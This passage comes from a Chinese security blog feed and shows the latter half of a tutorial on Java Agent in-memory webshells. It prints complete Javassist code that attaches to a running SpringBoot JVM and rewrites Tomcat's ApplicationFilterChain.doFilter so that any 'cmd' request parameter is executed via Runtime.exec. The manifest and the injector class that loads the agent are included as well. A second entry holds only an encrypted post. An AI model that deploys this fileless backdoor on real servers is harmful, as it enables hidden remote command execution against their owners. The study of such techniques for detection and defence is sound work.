class="string">&quot;AgentShell.Sleep_Hello&quot;</span>);  </span><br><span class="line">            System.out.println(ctClass);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取目标方法  </span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//设置方法体  </span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;  </span><br><span class="line">            ctMethod.setBody(body);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//返回目标类字节码  </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完毕之后打包 Java Agent 包，这里有个坑点是 <code>MAINFEST.MF</code> 需要修改如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span>  </span><br><span class="line">Agent-Class: AgentShell.agentmain_transform  </span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span>  </span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>最后编写动态注入 Agent 的注入类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            System.out.println(vmd.displayName());  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;AgentShell.Sleep_Hello&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//连接指定JVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//加载Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\target\\Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//断开JVM连接  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/InjectAgentSuccess.png" class><h3 id="Instrumentation-的局限性"><a href="#Instrumentation-的局限性" class="headerlink" title="Instrumentation 的局限性"></a>Instrumentation 的局限性</h3><p>大多数情况下，我们使用 Instrumentation 都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：</p><p>premain 和 agentmain 两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，也就是说必须要带有 Class 类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p><p>类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 <code>Instrumentation#redefineClasses</code> 方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是 private static&#x2F;final 修饰的</li><li>可以修改方法体</li></ol><h2 id="Agent-内存马实战"><a href="#Agent-内存马实战" class="headerlink" title="Agent 内存马实战"></a>Agent 内存马实战</h2><p>比如这里我们起一个 SpringBoot 的服务，由于 Tomcat 的责任链机制，可以看到会按照责任链机制反复调用 <code>ApplicationFilterChain#doFilter()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                        (java.security.PrivilegedExceptionAction&lt;Void&gt;) () -&gt; &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟到 <code>internalDoFilter()</code> 方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                  ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上两个方法均拥有 ServletRequest 和 ServletResponse，并且 hook 不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用</p><h3 id="利用-Java-Agent-实现-Spring-Filter-内存马"><a href="#利用-Java-Agent-实现-Spring-Filter-内存马" class="headerlink" title="利用 Java Agent 实现 Spring Filter 内存马"></a>利用 Java Agent 实现 Spring Filter 内存马</h3><p>我们复用上面的 agentmain-Agent，修改字节码的关键在于 <code>transformer()</code> 方法，因此我们重写该方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool            ClassPool classPool = ClassPool.getDefault();  </span></span><br><span class="line">  </span><br><span class="line">            <span class="comment">//添加额外的类搜索路径  </span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);  </span><br><span class="line">                classPool.insertClassPath(ccp);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取目标类  </span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//获取目标方法  </span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//设置方法体  </span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+  </span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">            ctMethod.setBody(body);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">//返回目标类字节码  </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();  </span><br><span class="line">            <span class="keyword">return</span> bytes;  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再准备 <code>MAINFEST.MF</code> 配置，以及 agent 主类代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">agentmain_transform</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException, UnmodifiableClassException &#123;  </span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//获取目标JVM加载的全部类  </span></span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (cls.getName().equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//添加一个transformer到Instrumentation，并重新触发目标类加载  </span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">Filter_Transform</span>(),<span class="literal">true</span>);  </span><br><span class="line">                inst.retransformClasses(cls);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>MAINFEST.MF</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span>  </span><br><span class="line">Agent-Class: com.drunkbaby.agentmain_transform</span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span>  </span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后准备 Inject 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException &#123;  </span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表  </span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();  </span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;  </span><br><span class="line">            System.out.println(vmd.displayName());  </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent  </span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().contains(<span class="string">&quot;JavaAgentSpringBootApplication&quot;</span>))&#123;  </span><br><span class="line">  </span><br><span class="line">                <span class="comment">//连接指定JVM  </span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());  </span><br><span class="line">                <span class="comment">//加载Agent  </span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;E:\\Coding\\Java\\JavaSecurityLearning\\JavaSecurity\\MemoryShell\\Java-Agent-Memshell\\AgentInjectionExample\\target\\AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);  </span><br><span class="line">                <span class="comment">//断开JVM连接  </span></span><br><span class="line">                virtualMachine.detach();  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入成功</p><img src="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/InjectSpringAgent.png" class><p>总而言之的攻击面应该是注入到 JVM 进程中</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>比起传统的 Tomcat 内存马，Agent 内存马在实现形式上其实还是打的 Tomcat 内存马。然而它的实现角度是通过遍历所有的 JVM 进程，然后向进程中去注入对应的 agent 类的。在 agent 类中通过 <code>ClassPool</code> 生成恶意代码</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">Java Agent 内存马</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE Apply For OpenWBS Productions</title>
    <link href="https://drun1baby.github.io/2023/11/30/CVE-Apply-For-OpenWBS-Productions/"/>
    <id>https://drun1baby.github.io/2023/11/30/CVE-Apply-For-OpenWBS-Productions/</id>
    <published>2023-11-30T06:21:58.000Z</published>
    <updated>2023-12-04T02:55:06.421Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3c0968a9a6ed77a1dd8d93580b7365bb9facbcc6f69d0d61fefd08fa43830035">99344be805abc5f525a7b74bfe5c03f0207f0698ac7f51d899ece4e43e874a995bdc26b9a82a38881f7ff135b185f6b94deb2c335212c90832ea1b03b727780300c6e26ee7209d96a223e20996c056261dc5ece39421079097127cd2fc16727742dc6b4f6d798037208f62f607e8cfd86367a2b3e3a428f8f27d7da5fa5c800101ad976361be02a39ec2f426d2fc6e7b087ad6964b6f3e2e67bd7ac41a860dac51fc5e2e2939a00f03a6516a24239bb53de87734385b8210a18a175b9d39b48e55ab40b2b1d448233b11b79170e3d4659ea9d23dfcaf7fb912144c336353bca9d6ac7b48f21c104f27594083d4070b16944ab9400386ec7fea7a615f854ceff92ae21f00e39953737860a05f4181d4acc6a701c6fcc4ad2f6249eea13fc37b95f59d0a7a65f9a81298297070330539a8b996250bccd92b401dd3b62c2a2b532058ff87577128b81a6bff07cd402b9ec98952db58d90f8abfd14adebca7042a48c389dd83954adbc3e99370c4c9e15bc8e3c95fdc8fda79be08240466e48ec71ac8e2eedd0acd515de7912ccfc8dcce9a24d38eb24dd8d1f77b9f340118974a59440310a55db2bf9589cc09b94805952031dd1bfda170408d25be7dec47797a4df96873de7e10d802d17e39bdc4efc740aacf8a93cd52c56cd6abc792c2835286c2e282f9b45ad3385f252be8a4b09f043b195c64ddae164badbd01c1f8845714ab9754989d9ad660afba23dbad25a0fc5f693ea090e0ff69570fa4bdd1b3cff0bd91446cc28f42f6362e0dee14678cc1795e8583cb21b7ad452e5bb7fa8216edc12125e9e6c1421dd224231a74a35b0d875f26cd278f1fccfd71a06b161c9fa13fd90d914b4e6dbc0f54a123dc167ff55f28602449966f925add0029cbd2459b8be65eb1408237c24ab45e7c2778694df96833a40574eb4b24a1f44a4b7b98c5062e234ae928044d400cc6458e3e724e80d00aa53c00702ee24cf2702a03e8b7f4815806d6ef7448b37682ad3b52c8b82463ee6091fe9a0d1a934ec146adf430b6c33b639c007979af2d4544181ffbf795e540ca1e102f1b046397dd771dda90bc880c4e524eb200c25d6b29bd18eaa6b79598427027bca71fdbb0ad3168fe7dcd5b509bf3421ec5d74faebd3d9b2377e96b026dd466c276e9014757d77bcbf1118aebd2e19355ad141b4e7e80966c427133365c5b5f1ccd9aa4939aa3c3cc4dc05aa4fb990077837b8ed559ad184b2593968ea0b626345288f7bdc170d242246f04f48cba8a29c31dbc3ac3ccd70cba08094181f783785be8a70332b1ec5e1667ac8e011d4847a17c56e1bbeb17a802837d9fbd4442ade3000ffc89fbe66eadd476c1990623c8bae0379a12bef2849052e0d9163f9f69cad8f481045d9536939d6c09de1429a94ae32da8cf5aa67059ed53236a5c731c62f91baa7bfe6ec9386dc4fcc6d60ece5c6a786e387db224fb241367d53088b095cf1c7a0344b637222e51a7d8ab8f50939c5fc8d209f9c9d980d44828fe836b25f826d1ed5b691bfa231d5c1aa2900b5f871c301e7646f984dbeed143f2c99602553f279ddf32d8b29e21d91fe3c142f3d406057a4db1813260e9091d107170b0ddce6ac7064f617a9e53fb04f678ca869c02727c67c99cc5535f192bd670e903a9a79e9dc670f4f94ceade5d6ee7596ac5d4461232f5bcce4cad83ae277fb0fb63ecf3ba5d8dd387abbab385b1a3d8104f2b2f32e9008a9119f6d5b96f31bc95edf13bb157b5418ee55dca02219e5105073e06ad8400192e402f553de76fb372feff215935dfb157de3f6dd000fa19d7967137702cf02343f95b4265ed905d9823851ba4493c106db9ae886b65d0b08a3d5d37065192a387121e69b10a8e5027bbb9ce32b573b81cfaf149aa87866a26547f7bab4648f6cd1312e8cce1b37a605d2cfa9eef6813211dbd170d6075e9bfc5ade5a17164343f2f33d3227bcc45290efe7cbce41b2e41026da88c5a5e761e7a4ac137c23c8066a49d06f947ac6c0aa4ede7056d2df896d60bd22e240f41247fa98e7e4a708515f00286961bb09d491a75be87805bca72be770972ec899d2c401946d34f685d460c2af40a60913b897c213a304e60af43a1e3def206bf167cd750f3888e99f87042f7f77e73560951c05833d5550a28cd0a24973def3c7083718f686af07abf4cdd2e271d1fca56680fc64b668df0ff5b668b27d6a500b8cc977360728de5c2d7b14d1c9486e8bfd8fec4a08fbe36405e059240ecc3cedd5c0b2177f168a65077c9d4dc8872fb0a0c81c5c68d40415964cf5fa32b8c0daf93467a7b4b2b28a74af656af0249e10c7972fe4c9e36011ca8f6c4dba4ea967909976b701bb3723aa29bdd5877889e9ffbf8ba218035cb51c7dac422340be68e91a8f664a2aa7fda53c26c66596f0af62f03fc838b03d5361dbe672fbf2da7e8107048ebfdcf9a09d4b3874396cd613da0ee4b86114ef19441a8ba2aa99f58bc5bb9bb82f396499d8e47ebdb1bfb914d6a7509d3a778104b7c36f0dab5d19352625458af4f803b6d908ee1b3a5b30e60404ae63d1a24d922adb2f6bd1a7eb9943ab9d24097baa3f73a855786b04551893c4624f9dc1a24474d7c7b6f3167c6d98348741aa5b31fc0816aba9bc5f4207a3e4a1819bae0c4e3ba03873709cbafc4faea46bd6dfe2b3df05106773fd6e556f64d007cd8306d25dbeb0d2afc8e524996eee79a6798510a5f66fd736174975683a93da1deb2275104a9088229db1f5f93f84371c128b0ea19506bba4d061e332b3c67a5e236bce890fea72319c7a50307c10fb2939f05b9f30647ab6811321c60c438878c107d646e17677757f49955bfd60ce7318bf9510fc102dc7a6b08b1130fc81f19104c0d34aa3f2d81d8ce70775bd49ed459fc733092ff1dc3b7322839747abf397d967b4ad307b7064ddfc398317bbb4c60d6b4691af98d1e8e65bd7b580f5ba3ed1ce313c69c1fdb773b6a685b1016b048de03dfbeea967d9fb1106ff664bcef1ee615f63b7612aaac1435855a75cf9dc80c97ca16a64bb3b0bad9bf344a06ee0fdc8ca4020e6eae697b5163fcd013962170fcf94834870c856d509d3b65c43cdf3b4316eded6a5e1ffade7f132fb21ecb960dda7d956a6e2aafe8a8260fe659fa24a4e51797114aa3995027dd7c9f14506efbb1237f1e6e133214ec2d2704c5401b43405792cfca85de675780fca4d941da82b12ebd5a239ec5bdaec0bad40a22bad7e5df633e9b587e537dacdc617a35294fbd5592cb859c0f9555a5a7ace032ef948bc77df064ee945f5b0bd867d22329534e2ab8a93a306e5a6fff39c9ed64845ceccf63aab4e753b8daf0b57dce087b69c93aca849b8cba6d7893235745c91934fda606128391711719ccfdac53f49452a53737ee0bd1992ffc6b32a21243e25626c367bc18c326b5d366b9918929ed5e90fcc1170633db1346112fe45091e54a67019aa20707dbdc0f67d2d782888f80bfb6cfdb2144299393df20b0fadeeec5b24da1035fe424131634a3f5d4852eef38b1b3c5e2ab4de8f5379f2b454554f57c5d6c9a7a4e1b07f4a098d18e7be9cb2ee8173af292c24e2fb49bbe90d60510339fcf348b1f4a711ba0f338566b4a998e3c2916643544a2ae2535a0030e065ea1ecad9ba266f3f79236112bb8fa2970afc882c7c50bfe7ee7594e4a8b6512f3e4b6e56fccd89da2eb657fd0793ee2bac39aa467d41d8ade78b460beba2303ab95df4a1837b1d271c8ed31a0ded81c55894970e1cb7912a2a555d2230c504226f3a7889737f6c277c0d97c38f2f931488da7d2c7e243526b2d7d0f99bdfac8a6ab4e2c4ee35dc3281fb6acb2bdd2ded50fb12b3e451b41cecfc5c2cc59b4b1454c762da4179f205dabc548f33dadd647068cc05adfc5d1674fb54e943672a6ac9fa1d2b33e38d3add5597d7feed1769e2a0167dabe1628bbe7070da00b375a3afca95f5a080dd5188563648e305bccd30f335d2d35062c40cfc03f07b19185488bde0f19c10b1ac9cbd815de13de119ad7ec20ffdf1528ea71ea541ea30306dccda3c168d2682c9059ee49c0ff91a5d49e09206f11d04df0fe890dca1044ea200cde7110047530b33662df89afa3322cbe25ebc4e281bc234a22d74a999cb6273026f4159baf02bdef55227849260a3f1b82a4e509839a5acd9ddb07c853b96d5f7dfc93bf458c1bb6d13a36dcc31a6b2a6aafd74ba31950ebd2a550f99f7ac5ec60893bbdabb5ce9afa444c240ab4d3fffb6cce978036952dfc533effebfb6c808ed6d306105b4d732008feec3218037591b8014ff9feb9f5adc372859e7ac3aca0a577d06dbbd8067a6eb35da8c3d40300a9058ea504dabadf0008b62ff1ded5aef7863af861d81d2a7d91be1c3a98d6bab90dd8d0e1413796b8d19159523a045981557d4fd179f16992296cd25f3ee54cef85fbe190adc895a33fd90441f142fd58fe69783a30ca148199ae845eee4acbea0f80022f6ae3119add84e4445e802fc2b0b1697411ab4977cb4667e63d8adba2d56f4be88a0101604c545adfc52bf5a60e9bd612ff25f2cc131b5d2ce8821c17edf5b265f81de898e45dc79d8acbb6a31df0b57890ba5ffed0d6668f15a0699f9b65943114c1cdf486b0f3462c4d1f39ded5f82d503444f7af3786a5421d547699710119b755f29720ba319e42958e6080c8c8e944b69f33df790ad9bd40351ea50b186ebfb4f65d153a89059a8202147d61c9d52cb6f3b189ebd5e71f9d2df78e6ec55017fd76f035f2ef0ef5c9384670ddfba40aa1c7ee78054c30e4aa31fe1aade470f81506448dbd359dfa79062e047e1b3431beb8a902564a7b5ff6595a0b0ce8dde29881c8c8488a4153fd8233ad396c3e962b7fbbed7675f81242e0a6e8381086896c7ffe8f3e2efd09650af7060c0ca73f5d6015d3ae28ee1a4a6af26f73c47bbc66b11244b3748ba58ef94997f92942aff0891101883610b7f2d0498597feb852fa27b4c8eb5b4c72a5f98241f8e0149bc1ba6e95154754097635a3926de8c71ebec825dadf6606e38531eec2f1407d1a5d3737c7de4e4ab5bccdbb879121e9d6eac6951a5e64ca450d00ae90202976105aa6eace248df7d88e05b792942248839aa658d47b2206bfedf60e19df117811923111af0f6870940bd6082c377e759e4f4f38cabdeecdb79a0abf862e733bcc94dba49b8785410dee9b4c6b2fe1dd75fc4b1f9961888ee896d76d1222eece426b81b219aa427756b2b22413e8443056a4efb4fdb677dfc2205c95aa85f290b620b58d467b6e7246e03f8cff05c8895199998ee4246b410fbcc104a62cb49f9f6dcf1d1c793ecbebeaf670c2ff4f13d003f03a9fdc63f7e00b623f25bb43d6752e1d5c645040572fa210ad8fd1effeb63337c7ca5db253d19a10870146b7373c0b40e1c6a8b915259cfea47f4cd6a43bdc27812cb322355019bf297150239e69f7d56a007cc0a85945b815fb3e425985c12ec6c930ef5842c5766e098f07433ecb3d9d767465bfebd62b2de47e3f3107ba3aae617d25fc8c148624aa052a773d89f0a3f10d48f9736b81f3c66e3d69b17af93cfad0f7d2afb5b7341fbd979a65b5cda0a88e52bbc9b758310be791dd93064cf77a3c7d9b4b3dbfb8c2ba02a273c24604bc6668f2be6b98c99d8b480f9a96e5aa3c4229193cbd1a2abdf054cddad1ba31cb0f1f71b2b3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content 